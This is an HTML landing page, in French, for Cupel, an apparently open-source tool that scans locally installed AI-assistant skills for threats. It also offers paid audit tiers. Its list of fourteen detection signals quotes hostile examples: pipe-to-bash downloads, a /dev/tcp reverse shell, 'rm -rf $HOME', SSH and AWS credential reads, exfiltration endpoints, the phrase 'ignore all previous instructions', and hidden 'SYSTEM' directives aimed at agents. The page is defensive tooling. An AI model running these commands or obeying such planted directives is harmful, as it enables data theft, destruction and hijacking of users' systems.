@@ -1,0 +1,678 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Cupel — sépare le métal pur des impuretés</title>
+  <meta name="description" content="Audit local des skills IA (Claude Code, Cursor, Codex, Windsurf, Gemini, Continue). 14 règles de détection : prompt injection, ASCII smuggling, tool poisoning, exfiltration. Zero network. MIT. Inspiré de la coupelle de l'essayeur d'or." />
+  <link rel="canonical" href="https://cupel.aissabelkoussa.fr/" />
+  <meta name="referrer" content="strict-origin-when-cross-origin" />
+  <meta name="theme-color" content="#F5F1E8" />
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://cupel.aissabelkoussa.fr/" />
+  <meta property="og:title" content="Cupel — sépare le métal pur des impuretés" />
+  <meta property="og:description" content="Audit local open-source des skills IA. 14 règles, zero network. npx @aissabelkoussa/cupel" />
+  <meta name="twitter:card" content="summary_large_image" />
+
+  <!-- Fonts non bannies — Fraunces (serif éditorial) + JetBrains Mono -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,300;0,9..144,400;0,9..144,500;0,9..144,700;0,9..144,900;1,9..144,300;1,9..144,400;1,9..144,800&family=JetBrains+Mono:wght@400;500;700&display=swap" />
+
+  <style>
+    :root {
+      --ivory: #F5F1E8;
+      --ivory-deep: #EDE6D6;
+      --ink: #1A1A1A;
+      --ink-soft: #3A3D40;
+      --sage: #7A8471;
+      --terracotta: #C9573B;
+      --terracotta-deep: #9B3F28;
+      --gold: #B8924A;
+      --danger: #962D2D;
+      --warn: #C97A3B;
+      --ok: #7A8471;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; }
+
+    body {
+      font-family: 'Fraunces', 'EB Garamond', Georgia, serif;
+      font-optical-sizing: auto;
+      font-weight: 400;
+      font-size: 17px;
+      line-height: 1.6;
+      color: var(--ink);
+      background: var(--ivory);
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    a { color: var(--terracotta); text-decoration: none; transition: color .15s ease; }
+    a:hover { color: var(--terracotta-deep); }
+    a:focus-visible { outline: 2px solid var(--terracotta); outline-offset: 3px; border-radius: 2px; }
+
+    code, pre, .mono { font-family: 'JetBrains Mono', ui-monospace, 'SF Mono', Consolas, monospace; }
+
+    /* ──────────── Layout asymétrique (pas hero centré 3-col banni) ──────────── */
+
+    .wrap { max-width: 1120px; margin: 0 auto; padding: 0 28px; }
+
+    .nav {
+      position: sticky; top: 0; z-index: 10;
+      backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
+      background: rgba(245, 241, 232, 0.85);
+      border-bottom: 1px solid rgba(0,0,0,0.06);
+      padding: 14px 0;
+    }
+    .nav .wrap { display: flex; align-items: baseline; justify-content: space-between; }
+    .nav-brand { font-weight: 900; font-size: 21px; letter-spacing: -0.01em; }
+    .nav-brand i { font-style: italic; color: var(--terracotta); font-weight: 400; }
+    .nav-meta { font-size: 13px; color: var(--sage); font-family: 'JetBrains Mono', monospace; }
+    .nav-meta a { color: var(--ink-soft); border-bottom: 1px dotted var(--sage); padding-bottom: 1px; }
+
+    /* ─── Hero asymétrique 7/5 ─── */
+    .hero { padding: 96px 0 80px; }
+    .hero-grid {
+      display: grid;
+      grid-template-columns: 7fr 5fr;
+      gap: 56px;
+      align-items: end;
+    }
+    @media (max-width: 880px) {
+      .hero-grid { grid-template-columns: 1fr; gap: 36px; }
+      .hero { padding: 56px 0 48px; }
+    }
+
+    .eyebrow {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      letter-spacing: 0.18em;
+      text-transform: uppercase;
+      color: var(--sage);
+      margin-bottom: 22px;
+    }
+    .eyebrow .dot {
+      display: inline-block;
+      width: 6px; height: 6px;
+      background: var(--ok); border-radius: 50%;
+      margin-right: 8px;
+      vertical-align: middle;
+      animation: pulse 2.6s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 0.4; }
+      50% { opacity: 1; }
+    }
+
+    h1 {
+      font-size: clamp(40px, 6.2vw, 78px);
+      line-height: 1.02;
+      letter-spacing: -0.025em;
+      font-weight: 900;
+      font-variation-settings: "opsz" 144;
+    }
+    h1 .impur { font-style: italic; font-weight: 300; color: var(--sage); }
+
+    .hero-text {
+      margin-top: 28px;
+      font-size: 18px;
+      line-height: 1.55;
+      max-width: 540px;
+      color: var(--ink-soft);
+    }
+    .hero-text strong { color: var(--ink); font-weight: 700; }
+
+    .hero-aside {
+      border: 1px solid rgba(0,0,0,0.08);
+      background: var(--ivory-deep);
+      padding: 22px;
+      border-radius: 4px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13.5px;
+      box-shadow: 0 1px 0 rgba(0,0,0,0.04);
+    }
+    .terminal-bar {
+      display: flex; gap: 6px; margin-bottom: 14px;
+    }
+    .terminal-bar span {
+      display: inline-block; width: 10px; height: 10px; border-radius: 50%;
+      background: rgba(0,0,0,0.12);
+    }
+    .term-prompt { color: var(--sage); }
+    .term-cmd { color: var(--ink); display: block; margin-top: 2px; }
+    .term-output { margin-top: 16px; font-size: 12.5px; line-height: 1.65; color: var(--ink-soft); }
+    .term-output .ok { color: var(--ok); }
+    .term-output .warn { color: var(--warn); }
+    .term-output .danger { color: var(--danger); font-weight: 700; }
+    .term-output .dim { color: var(--sage); }
+
+    /* ─── Section narrative (4000 ans) ─── */
+    .narrative {
+      padding: 80px 0;
+      border-top: 1px solid rgba(0,0,0,0.06);
+      border-bottom: 1px solid rgba(0,0,0,0.06);
+      background: linear-gradient(180deg, var(--ivory) 0%, var(--ivory-deep) 100%);
+    }
+    .narrative-grid {
+      display: grid;
+      grid-template-columns: 5fr 7fr;
+      gap: 56px;
+      align-items: start;
+    }
+    @media (max-width: 880px) {
+      .narrative-grid { grid-template-columns: 1fr; gap: 28px; }
+      .narrative { padding: 56px 0; }
+    }
+    .narrative-figure {
+      font-family: 'Fraunces', serif;
+      font-style: italic;
+      font-weight: 300;
+      font-size: clamp(32px, 4vw, 52px);
+      line-height: 1.05;
+      color: var(--ink);
+      letter-spacing: -0.015em;
+    }
+    .narrative-figure strong { font-style: normal; font-weight: 900; color: var(--terracotta); }
+    .narrative-figure .year {
+      display: block;
+      font-family: 'JetBrains Mono', monospace;
+      font-style: normal;
+      font-size: 13px;
+      letter-spacing: 0.08em;
+      color: var(--sage);
+      margin-top: 18px;
+      font-weight: 500;
+    }
+    .narrative-body { font-size: 18px; line-height: 1.65; color: var(--ink-soft); }
+    .narrative-body p { margin-bottom: 14px; }
+    .narrative-body strong { color: var(--ink); font-weight: 700; }
+
+    /* ─── 14 signaux : liste typographique, pas grille ─── */
+    .signals { padding: 96px 0; }
+    .signals-header { margin-bottom: 56px; max-width: 720px; }
+    .signals-header h2 {
+      font-size: clamp(32px, 4.4vw, 52px);
+      font-weight: 900;
+      letter-spacing: -0.02em;
+      line-height: 1.05;
+      margin-bottom: 16px;
+    }
+    .signals-header h2 em { font-weight: 300; color: var(--sage); }
+    .signals-header p { color: var(--ink-soft); font-size: 18px; max-width: 580px; }
+
+    .signal-list {
+      list-style: none;
+      border-top: 1px solid rgba(0,0,0,0.1);
+    }
+    .signal-list li {
+      display: grid;
+      grid-template-columns: 28px 1fr 2fr;
+      gap: 18px;
+      padding: 18px 0;
+      border-bottom: 1px solid rgba(0,0,0,0.06);
+      align-items: baseline;
+    }
+    @media (max-width: 720px) {
+      .signal-list li { grid-template-columns: 24px 1fr; }
+      .signal-list .desc { grid-column: 2 / 3; color: var(--ink-soft); font-size: 14.5px; margin-top: 4px; }
+    }
+    .signal-list .num {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      color: var(--sage);
+      font-weight: 500;
+    }
+    .signal-list .name {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 14.5px;
+      color: var(--ink);
+      font-weight: 500;
+    }
+    .signal-list .name.new {
+      color: var(--terracotta);
+      position: relative;
+    }
+    .signal-list .name.new::after {
+      content: "v0.2";
+      font-size: 9px;
+      letter-spacing: 0.1em;
+      margin-left: 10px;
+      padding: 2px 6px;
+      background: var(--terracotta);
+      color: var(--ivory);
+      vertical-align: middle;
+      border-radius: 2px;
+    }
+    .signal-list .desc {
+      color: var(--ink-soft);
+      font-size: 15px;
+      line-height: 1.5;
+    }
+    .signal-list code {
+      background: rgba(0,0,0,0.05);
+      padding: 1px 5px;
+      border-radius: 2px;
+      font-size: 12.5px;
+    }
+
+    /* ─── Tarifs ─── */
+    .pricing {
+      padding: 80px 0;
+      background: var(--ivory-deep);
+      border-top: 1px solid rgba(0,0,0,0.06);
+    }
+    .pricing-header { margin-bottom: 48px; max-width: 720px; }
+    .pricing-header h2 {
+      font-size: clamp(28px, 3.8vw, 44px);
+      font-weight: 900;
+      letter-spacing: -0.02em;
+      line-height: 1.1;
+    }
+    .pricing-header h2 em { font-style: italic; font-weight: 300; color: var(--terracotta); }
+
+    .tiers {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 16px;
+    }
+    @media (max-width: 1020px) {
+      .tiers { grid-template-columns: repeat(2, 1fr); }
+    }
+    @media (max-width: 560px) {
+      .tiers { grid-template-columns: 1fr; }
+    }
+    .tier {
+      background: var(--ivory);
+      border: 1px solid rgba(0,0,0,0.08);
+      padding: 26px 22px;
+      border-radius: 4px;
+      display: flex;
+      flex-direction: column;
+    }
+    .tier.featured {
+      border-color: var(--ink);
+      box-shadow: 0 1px 0 rgba(0,0,0,0.04), 0 8px 24px -16px rgba(0,0,0,0.2);
+      position: relative;
+    }
+    .tier.featured::before {
+      content: "Découverte";
+      position: absolute; top: -10px; left: 22px;
+      background: var(--ink);
+      color: var(--ivory);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 10px;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      padding: 4px 10px;
+      border-radius: 2px;
+    }
+    .tier-name {
+      font-size: 14px;
+      color: var(--sage);
+      font-family: 'JetBrains Mono', monospace;
+      letter-spacing: 0.04em;
+      margin-bottom: 10px;
+    }
+    .tier-price {
+      font-size: 36px;
+      font-weight: 900;
+      letter-spacing: -0.02em;
+      line-height: 1;
+      margin-bottom: 4px;
+    }
+    .tier-price small { font-size: 14px; font-weight: 400; color: var(--sage); display: block; margin-top: 4px; }
+    .tier-tagline {
+      font-size: 13.5px;
+      color: var(--ink-soft);
+      margin-bottom: 18px;
+      font-style: italic;
+    }
+    .tier ul {
+      list-style: none;
+      flex: 1;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+    .tier ul li {
+      padding: 7px 0;
+      padding-left: 14px;
+      position: relative;
+      color: var(--ink-soft);
+    }
+    .tier ul li::before {
+      content: "·";
+      position: absolute; left: 4px; top: 4px;
+      color: var(--terracotta);
+      font-weight: 900;
+    }
+    .tier .cta {
+      margin-top: 22px;
+      display: inline-flex;
+      align-items: center; justify-content: center;
+      padding: 11px 16px;
+      border-radius: 3px;
+      font-size: 14px;
+      font-weight: 500;
+      font-family: 'Fraunces', serif;
+      transition: background .15s ease, border-color .15s ease;
+    }
+    .tier .cta.primary {
+      background: var(--ink);
+      color: var(--ivory);
+    }
+    .tier .cta.primary:hover { background: var(--terracotta); color: var(--ivory); }
+    .tier .cta.secondary {
+      border: 1px solid rgba(0,0,0,0.18);
+      color: var(--ink);
+    }
+    .tier .cta.secondary:hover { border-color: var(--ink); }
+
+    /* ─── Final CTA narratif ─── */
+    .final {
+      padding: 96px 0 80px;
+      text-align: left;
+    }
+    .final-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 56px;
+      align-items: center;
+    }
+    @media (max-width: 880px) {
+      .final-grid { grid-template-columns: 1fr; gap: 36px; }
+    }
+    .final-text h2 {
+      font-size: clamp(28px, 4vw, 44px);
+      font-weight: 900;
+      letter-spacing: -0.02em;
+      line-height: 1.05;
+      margin-bottom: 16px;
+    }
+    .final-text h2 em { font-weight: 300; font-style: italic; color: var(--sage); }
+    .final-text p { color: var(--ink-soft); font-size: 17px; line-height: 1.55; }
+    .final-cmd {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: clamp(16px, 1.6vw, 19px);
+      background: var(--ink);
+      color: var(--ivory);
+      padding: 24px 26px;
+      border-radius: 4px;
+      position: relative;
+      overflow-x: auto;
+    }
+    .final-cmd::before {
+      content: "$";
+      color: var(--sage);
+      margin-right: 12px;
+    }
+    .final-actions {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      margin-top: 28px;
+    }
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 13px 22px;
+      border-radius: 3px;
+      font-size: 15px;
+      font-weight: 500;
+      font-family: 'Fraunces', serif;
+      transition: background .15s ease, border-color .15s ease, color .15s ease;
+    }
+    .btn-primary { background: var(--ink); color: var(--ivory); }
+    .btn-primary:hover { background: var(--terracotta); color: var(--ivory); }
+    .btn-ghost { border: 1px solid rgba(0,0,0,0.2); color: var(--ink); }
+    .btn-ghost:hover { border-color: var(--ink); }
+
+    /* ─── Footer ─── */
+    footer {
+      border-top: 1px solid rgba(0,0,0,0.08);
+      padding: 32px 0 56px;
+      font-size: 13.5px;
+      color: var(--sage);
+      font-family: 'JetBrains Mono', monospace;
+    }
+    footer .wrap {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 28px;
+      flex-wrap: wrap;
+    }
+    footer a { color: var(--ink-soft); border-bottom: 1px dotted var(--sage); padding-bottom: 1px; }
+
+    /* ─── Animation fade-up on scroll (vanilla, no framer) ─── */
+    .reveal { opacity: 0; transform: translateY(16px); transition: opacity .7s ease, transform .7s ease; }
+    .reveal.in { opacity: 1; transform: translateY(0); }
+
+    /* Respect prefers-reduced-motion */
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+      }
+      .reveal { opacity: 1; transform: none; }
+    }
+
+    /* Focus visible WCAG 2.2 */
+    .btn:focus-visible, .tier .cta:focus-visible {
+      outline: 2px solid var(--terracotta);
+      outline-offset: 3px;
+    }
+
+    ::selection { background: var(--terracotta); color: var(--ivory); }
+  </style>
+</head>
+<body>
+
+  <nav class="nav">
+    <div class="wrap">
+      <div class="nav-brand">cupel<i> · </i><span style="font-weight:400; color:var(--sage);">essayeur de skills IA</span></div>
+      <div class="nav-meta">
+        <a href="https://www.npmjs.com/package/@aissabelkoussa/cupel" target="_blank" rel="noopener">npm</a>&nbsp;·&nbsp;
+        <a href="https://github.com/aissablk1/cupel" target="_blank" rel="noopener">github</a>&nbsp;·&nbsp;
+        <a href="https://aissabelkoussa.fr/cupel">audit</a>
+      </div>
+    </div>
+  </nav>
+
+  <header class="hero">
+    <div class="wrap hero-grid">
+      <div>
+        <p class="eyebrow"><span class="dot"></span>Open source · MIT · zéro réseau</p>
+        <h1>
+          Sépare le métal pur
+          <br /><span class="impur">des impuretés.</span>
+        </h1>
+        <p class="hero-text">
+          <strong>Cupel</strong> audite localement les skills IA installés sur ta machine — Claude Code, Cursor, Codex, Windsurf, Gemini, Continue. 14 catégories de détection&nbsp;: prompt injection, ASCII smuggling, tool poisoning, exfiltration de credentials, reverse shells.
+        </p>
+        <p class="hero-text" style="margin-top:12px;">
+          Le nom vient de la <em>coupelle</em>, instrument de l'essayeur d'or depuis 4&nbsp;000 ans. On y dépose l'échantillon, on chauffe, les impuretés sont absorbées, le métal pur reste.
+        </p>
+      </div>
+
+      <aside class="hero-aside">
+        <div class="terminal-bar">
+          <span></span><span></span><span></span>
+        </div>
+        <span class="term-prompt">$</span>
+        <span class="term-cmd">npx @aissabelkoussa/cupel</span>
+        <div class="term-output">
+          <span class="dim">cupel scan — 6 platforms detected, local only, zero network…</span><br />
+          <span class="dim">cupel scan — 376 skills analysed in 0.34s</span><br /><br />
+          &nbsp;&nbsp;<span class="ok">○ 367 sûrs</span>&nbsp;&nbsp;&nbsp;<span class="warn">◐ 5 à vérifier</span>&nbsp;&nbsp;&nbsp;<span class="danger">● 4 risque</span><br /><br />
+          &nbsp;&nbsp;<span class="danger">● _external</span>&nbsp;&nbsp;<span class="dim">score 60</span><br />
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="dim">· shell_pipe_to_interpreter (+50)</span><br />
+          &nbsp;&nbsp;<span class="danger">● docker-development</span>&nbsp;&nbsp;<span class="dim">score 50</span><br />
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="dim">· rm_rf_root (+40)</span><br />
+        </div>
+      </aside>
+    </div>
+  </header>
+
+  <section class="narrative reveal">
+    <div class="wrap narrative-grid">
+      <div class="narrative-figure">
+        4&nbsp;000 ans <strong>d'audit</strong>
+        de pureté, transposés au code IA.
+        <span class="year">— Égypte ancienne → mai 2026</span>
+      </div>
+      <div class="narrative-body">
+        <p>Quand un orfèvre antique recevait un lingot, il avait un problème connu&nbsp;: c'était du <strong>vrai or pur</strong>, ou un alliage avec des métaux moins nobles coulés ensemble pour faire passer un faux pour un vrai&nbsp;?</p>
+        <p>La technique inventée par les Égyptiens, raffinée par Grecs, Romains et médiévaux, s'appelle la <em>coupellation</em>. On dépose l'échantillon dans une petite coupelle en céramique poreuse (<span class="mono">cupella</span> en latin). On chauffe à 1&nbsp;000&nbsp;°C. La céramique absorbe les impuretés — plomb, scories, alliages. Seul reste un bouton de métal pur, isolé, lisible.</p>
+        <p>C'est <strong>l'outil d'audit de pureté le plus ancien de l'humanité</strong>. Toujours utilisé dans les laboratoires d'essai des métaux précieux.</p>
+        <p>J'ai pensé qu'on pouvait faire la même chose pour les skills IA.</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="signals" id="signals">
+    <div class="wrap">
+      <div class="signals-header reveal">
+        <h2>14 signaux. <em>Lisibles dans 500 lignes de code.</em></h2>
+        <p>Pas de modèle d'apprentissage, pas de boîte noire. Du regex, du scoring composite, trois tiers&nbsp;: <code>ok</code>, <code>warn</code>, <code>danger</code>. Les trois derniers signaux (en orange) ont été ajoutés en mai 2026 pour les vecteurs LLM-natifs documentés par Snyk ToxicSkills et Invariant Labs.</p>
+      </div>
+
+      <ul class="signal-list">
+        <li><span class="num">01</span><span class="name">shell_pipe_to_interpreter</span><span class="desc"><code>curl https://x.io/y.sh | bash</code></span></li>
+        <li><span class="num">02</span><span class="name">reverse_shell_tcp</span><span class="desc"><code>/dev/tcp/10.0.0.1/4444</code></span></li>
+        <li><span class="num">03</span><span class="name">rm_rf_root</span><span class="desc"><code>rm -rf $HOME</code></span></li>
+        <li><span class="num">04</span><span class="name">prompt_injection</span><span class="desc">« ignore all previous instructions » (FR + EN)</span></li>
+        <li><span class="num">05</span><span class="name">cred_file_read</span><span class="desc"><code>cat ~/.ssh/id_rsa</code>, <code>~/.aws/credentials</code></span></li>
+        <li><span class="num">06</span><span class="name">credential_pattern</span><span class="desc">clés AWS / Stripe / OpenAI hardcodées</span></li>
+        <li><span class="num">07</span><span class="name">webhook_exfil</span><span class="desc">endpoints d'exfiltration connus (<code>webhook.site</code>, ngrok)</span></li>
+        <li><span class="num">08</span><span class="name">powershell_iwr_iex</span><span class="desc">équivalent Windows de <code>curl | bash</code></span></li>
+        <li><span class="num">09</span><span class="name">eval_dynamic</span><span class="desc"><code>eval(atob(...))</code></span></li>
+        <li><span class="num">10</span><span class="name new">invisible_unicode</span><span class="desc">zero-width chars, RTL override (ASCII smuggling)</span></li>
+        <li><span class="num">11</span><span class="name new">tool_poisoning_directive</span><span class="desc">directives cachées agent (<code>&lt;!-- SYSTEM: ... --&gt;</code>, IMPORTANT FOR ASSISTANT)</span></li>
+        <li><span class="num">12</span><span class="name new">hex_escape_chain</span><span class="desc"><code>\xNN\xNN…</code>, <code>String.fromCharCode(N,N,…)</code></span></li>
+        <li><span class="num">13</span><span class="name">no_manifest</span><span class="desc">absence de <code>SKILL.md</code> / <code>README.md</code> / <code>manifest.json</code></span></li>
+        <li><span class="num">14</span><span class="name">stale</span><span class="desc">dernière modif &gt; 365 jours</span></li>
+      </ul>
+
+      <p style="margin-top: 32px; font-size: 14px; color: var(--sage); max-width:580px;">
+        Les installeurs trusted (<code>sh.rustup.rs</code>, <code>nodejs.org</code>, <code>get.docker.com</code>) sont reconnus et leur poids divisé par&nbsp;2 — pas de faux positif sur les setups légitimes.
+      </p>
+    </div>
+  </section>
+
+  <section class="pricing">
+    <div class="wrap">
+      <div class="pricing-header reveal">
+        <h2>Le CLI est libre. <em>L'humain qui auditera</em> ton stack a un prix.</h2>
+      </div>
+
+      <div class="tiers">
+        <div class="tier">
+          <p class="tier-name">CLI gratuit</p>
+          <p class="tier-price">0&nbsp;€<small>illimité, local</small></p>
+          <p class="tier-tagline">Scanne, audite, intègre en CI.</p>
+          <ul>
+            <li>npx @aissabelkoussa/cupel</li>
+            <li>Multi-plateformes</li>
+            <li>Sortie SARIF + JSON</li>
+            <li>Code MIT auditable</li>
+          </ul>
+          <a class="cta secondary" href="https://github.com/aissablk1/cupel" target="_blank" rel="noopener">Voir le code&nbsp;›</a>
+        </div>
+
+        <div class="tier featured">
+          <p class="tier-name">Audit async</p>
+          <p class="tier-price">590&nbsp;€<small>1 freelance ou indé</small></p>
+          <p class="tier-tagline">Livraison J+5. Pas de calendrier à caler.</p>
+          <ul>
+            <li>Rapport PDF 12-18 pages</li>
+            <li>Politique CI prête à coller</li>
+            <li>30 min Loom commenté</li>
+            <li>Support email 7 jours</li>
+          </ul>
+          <a class="cta primary" href="https://aissabelkoussa.fr/contact?sujet=cupel-audit-590">Réserver&nbsp;›</a>
+        </div>
+
+        <div class="tier">
+          <p class="tier-name">Audit équipe</p>
+          <p class="tier-price">1&nbsp;490&nbsp;€<small>jusqu'à 10 devs</small></p>
+          <p class="tier-tagline">Audit + politique + formation 2&nbsp;h.</p>
+          <ul>
+            <li>Skills déployés en équipe</li>
+            <li>Politique de validation</li>
+            <li>Rapport CTO / Head of Sec</li>
+            <li>Support 30 jours</li>
+          </ul>
+          <a class="cta secondary" href="https://aissabelkoussa.fr/contact?sujet=cupel-audit-equipe">En discuter&nbsp;›</a>
+        </div>
+
+        <div class="tier">
+          <p class="tier-name">Cupel Org</p>
+          <p class="tier-price">4&nbsp;900&nbsp;€<small>30+ devs · SLA</small></p>
+          <p class="tier-tagline">Sessions trimestrielles, accès direct.</p>
+          <ul>
+            <li>Audit multi-équipes</li>
+            <li>Politique CI custom</li>
+            <li>SLA réponse 24&nbsp;h</li>
+            <li>Accès message privé</li>
+          </ul>
+          <a class="cta secondary" href="https://aissabelkoussa.fr/contact?sujet=cupel-org">Parler à Aïssa&nbsp;›</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="final">
+    <div class="wrap final-grid">
+      <div class="final-text reveal">
+        <h2>Trente secondes pour scanner.<br /><em>Cinq minutes pour comprendre.</em></h2>
+        <p>Tape la commande. Lis le rapport. Désinstalle ce qui doit l'être. Si tu veux qu'on regarde ensemble, je prends deux audits par mois.</p>
+        <div class="final-actions">
+          <a class="btn btn-primary" href="https://github.com/aissablk1/cupel" target="_blank" rel="noopener">Code source MIT&nbsp;›</a>
+          <a class="btn btn-ghost" href="https://aissabelkoussa.fr/contact?sujet=cupel-audit-590">Réserver l'audit 590&nbsp;€&nbsp;›</a>
+        </div>
+      </div>
+      <div>
+        <pre class="final-cmd">npx @aissabelkoussa/cupel</pre>
+        <p style="margin-top:14px; font-size: 13px; color: var(--sage); font-family: 'JetBrains Mono', monospace;">
+          # Node.js ≥ 22 · zero install · zero network
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="wrap">
+      <div>
+        cupel · par Aïssa BELKOUSSA · <a href="https://aissabelkoussa.fr">aissabelkoussa.fr</a>
+      </div>
+      <div>
+        <a href="https://github.com/aissablk1/cupel">source</a>&nbsp;·&nbsp;
+        <a href="https://www.npmjs.com/package/@aissabelkoussa/cupel">npm</a>&nbsp;·&nbsp;
+        <a href="https://github.com/aissablk1/cupel/blob/main/LICENSE">MIT</a>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    // Reveal on scroll — vanilla IntersectionObserver
+    const reveals = document.querySelectorAll('.reveal');
+    const io = new IntersectionObserver((entries) => {
+      entries.forEach(e => {
+        if (e.isIntersecting) {
+          e.target.classList.add('in');
+          io.unobserve(e.target);
+        }
+      });
+    }, { threshold: 0.1, rootMargin: '0px 0px -10% 0px' });
+    reveals.forEach(el => io.observe(el));
+  </script>
+
+</body>
+</html>
